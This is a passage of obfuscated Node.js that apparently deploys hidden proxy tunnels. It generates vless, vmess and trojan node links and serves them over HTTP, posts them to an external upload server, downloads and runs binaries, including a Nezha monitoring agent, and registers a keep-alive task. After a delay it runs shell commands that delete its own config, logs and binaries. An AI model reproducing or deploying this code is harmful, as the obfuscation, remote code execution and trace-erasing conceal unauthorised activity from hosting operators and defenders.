axios[_0x448694(_0x544189._0x689957)](_0x448694(_0x544189._0x4546e1),{'timeout':0xbb8});if(_0x1681fd[_0x448694(0x1e7)]&&_0x1681fd[_0x448694(_0x544189._0x32dfeb)][_0x448694(_0x544189._0x280d65)]===_0x448694(_0x544189._0x24382a)&&_0x1681fd['data']['countryCode']&&_0x1681fd[_0x448694(_0x544189._0x32dfeb)]['org'])return _0x1681fd['data']['countryCode']+'_'+_0x1681fd[_0x448694(_0x544189._0x32dfeb)][_0x448694(_0x544189._0x456a25)];}catch(_0x589bc2){}}return'Unknown';}async function _0x133460(_0x45554e){const _0x3be7df={_0x42c34f:0x275,_0x1d2e99:0x1ff,_0x189957:0x1c0,_0x3d9cb9:0x24b,_0x26fdff:0x1eb,_0x574bc9:0x1ec,_0x7e5fbf:0x21c,_0x4d22de:0x26c,_0x46b5b8:0x1eb,_0x3651ef:0x209},_0x4e6f48=await _0x42da7e(),_0xb950c1=NAME?NAME+'-'+_0x4e6f48:_0x4e6f48;return new Promise(_0x5858cf=>{const _0x19f22c={_0x89176c:0x209,_0x23a37a:0x1f6,_0x35a61c:0x20a,_0x377554:0x259};setTimeout(()=>{const _0x196165=_0x30a6,_0x4ed02c={'v':'2','ps':''+_0xb950c1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x196165(0x275),'net':'ws','type':_0x196165(_0x3be7df._0x42c34f),'host':_0x45554e,'path':_0x196165(0x24d),'tls':_0x196165(_0x3be7df._0x1d2e99),'sni':_0x45554e,'alpn':'','fp':_0x196165(_0x3be7df._0x189957)},_0x6ed2ab=_0x196165(0x269)+UUID+'@'+CFIP+':'+CFPORT+_0x196165(0x270)+_0x45554e+_0x196165(0x231)+_0x45554e+_0x196165(_0x3be7df._0x3d9cb9)+_0xb950c1+'\x0a\x0avmess://'+Buffer[_0x196165(_0x3be7df._0x26fdff)](JSON[_0x196165(_0x3be7df._0x574bc9)](_0x4ed02c))[_0x196165(_0x3be7df._0x7e5fbf)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x196165(0x242)+_0x45554e+_0x196165(0x231)+_0x45554e+_0x196165(0x1da)+_0xb950c1+'\x0a\x20\x20\x20\x20';console[_0x196165(_0x3be7df._0x4d22de)](Buffer[_0x196165(0x1eb)](_0x6ed2ab)['toString'](_0x196165(0x209))),fs[_0x196165(0x1c1)](subPath,Buffer[_0x196165(_0x3be7df._0x46b5b8)](_0x6ed2ab)[_0x196165(_0x3be7df._0x7e5fbf)](_0x196165(_0x3be7df._0x3651ef))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x30505d,_0x5c8168)=>{const _0x4977f1=_0x196165,_0x590cea=Buffer[_0x4977f1(0x1eb)](_0x6ed2ab)['toString'](_0x4977f1(_0x19f22c._0x89176c));_0x5c8168[_0x4977f1(_0x19f22c._0x23a37a)](_0x4977f1(0x201),_0x4977f1(_0x19f22c._0x35a61c)),_0x5c8168[_0x4977f1(_0x19f22c._0x377554)](_0x590cea);}),_0x5858cf(_0x6ed2ab);},0x7d0);});}}async function uploadNodes(){const _0x4d62ce={_0x47390c:0x23e,_0x315a5e:0x22a,_0x4925fc:0x1f8,_0x19bf73:0x26c,_0x3315b2:0x238,_0x26edd2:0x230,_0x42e657:0x1f8},_0x5baf6c=_0x15359e;if(UPLOAD_URL&&PROJECT_URL){const _0x1e4cd9=PROJECT_URL+'/'+SUB_PATH,_0x1c3090={'subscription':[_0x1e4cd9]};try{const _0x27034b=await axios[_0x5baf6c(_0x4d62ce._0x47390c)](UPLOAD_URL+_0x5baf6c(_0x4d62ce._0x315a5e),_0x1c3090,{'headers':{'Content-Type':'application/json'}});return _0x27034b&&_0x27034b[_0x5baf6c(_0x4d62ce._0x4925fc)]===0xc8?(console[_0x5baf6c(_0x4d62ce._0x19bf73)](_0x5baf6c(0x1f5)),_0x27034b):null;}catch(_0x2b74c4){if(_0x2b74c4[_0x5baf6c(_0x4d62ce._0x3315b2)]){if(_0x2b74c4[_0x5baf6c(_0x4d62ce._0x3315b2)][_0x5baf6c(0x1f8)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5baf6c(0x22f)](listPath))return;const _0x1dcea1=fs['readFileSync'](listPath,_0x5baf6c(0x227)),_0x44dc57=_0x1dcea1[_0x5baf6c(0x256)]('\x0a')[_0x5baf6c(_0x4d62ce._0x26edd2)](_0x5fe2a9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5baf6c(0x1ed)](_0x5fe2a9));if(_0x44dc57['length']===0x0)return;const _0x4d3df6=JSON['stringify']({'nodes':_0x44dc57});try{const _0x3fd84d=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x4d3df6,{'headers':{'Content-Type':'application/json'}});return _0x3fd84d&&_0x3fd84d[_0x5baf6c(_0x4d62ce._0x42e657)]===0xc8?(console[_0x5baf6c(0x26c)]('Nodes\x20uploaded\x20successfully'),_0x3fd84d):null;}catch(_0x4b66a8){return null;}}else return;}}function cleanFiles(){const _0x40b120={_0xa511b2:0x276,_0x1aeb8e:0x235,_0x13d2dd:0x20e,_0xd4c97d:0x221},_0x568590={_0x5a538a:0x232,_0x496eb9:0x239,_0x5ba02d:0x26c,_0xcaed3a:0x203},_0x4d605c={_0x2516f6:0x232,_0x5a4afc:0x239,_0x31adbc:0x26c};setTimeout(()=>{const _0x28a1d6=_0x30a6,_0x5c96c4=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5c96c4[_0x28a1d6(_0x40b120._0xa511b2)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5c96c4[_0x28a1d6(0x276)](phpPath);process[_0x28a1d6(0x23a)]===_0x28a1d6(0x1c8)?exec(_0x28a1d6(_0x40b120._0x1aeb8e)+_0x5c96c4[_0x28a1d6(_0x40b120._0x13d2dd)]('\x20')+_0x28a1d6(0x23d),_0x83830e=>{const _0x480982=_0x28a1d6;console[_0x480982(_0x4d605c._0x2516f6)](),console[_0x480982(0x26c)](_0x480982(_0x4d605c._0x5a4afc)),console[_0x480982(_0x4d605c._0x31adbc)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x28a1d6(0x25d)+_0x5c96c4[_0x28a1d6(0x20e)]('\x20')+_0x28a1d6(_0x40b120._0xd4c97d),_0x5efad9=>{const _0x1bd16d=_0x28a1d6;console[_0x1bd16d(_0x568590._0x5a538a)](),console['log'](_0x1bd16d(_0x568590._0x496eb9)),console[_0x1bd16d(_0x568590._0x5ba02d)](_0x1bd16d(_0x568590._0xcaed3a));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2d168e={_0x31c1d6:0x26c,_0x22afba:0x1ef,_0x55a20c:0x248,_0xf47b61:0x22d},_0x28f5c2=_0x15359e;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x28f5c2(_0x2d168e._0x31c1d6)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x15e91e=await axios[_0x28f5c2(0x23e)](_0x28f5c2(_0x2d168e._0x22afba),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x28f5c2(0x220)}});return console[_0x28f5c2(0x26c)](_0x28f5c2(0x1e2)),_0x15e91e;}catch(_0x4e87f6){return console['error'](_0x28f5c2(_0x2d168e._0x55a20c)+_0x4e87f6[_0x28f5c2(_0x2d168e._0xf47b61)]),null;}}async function startserver(){const _0x3a275e=_0x15359e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x18b9f4){console['error'](_0x3a275e(0x261),_0x18b9f4);}}startserver()[_0x15359e(0x22c)](_0x2a0345=>{const _0x23b13d={_0x495526:0x255},_0x33fd89=_0x15359e;console[_0x33fd89(0x1c6)](_0x33fd89(_0x23b13d._0x495526),_0x2a0345);}),app[_0x15359e(0x1fa)](PORT,()=>console[_0x15359e(0x26c)](_0x15359e(0x1bf)+PORT+'!'));
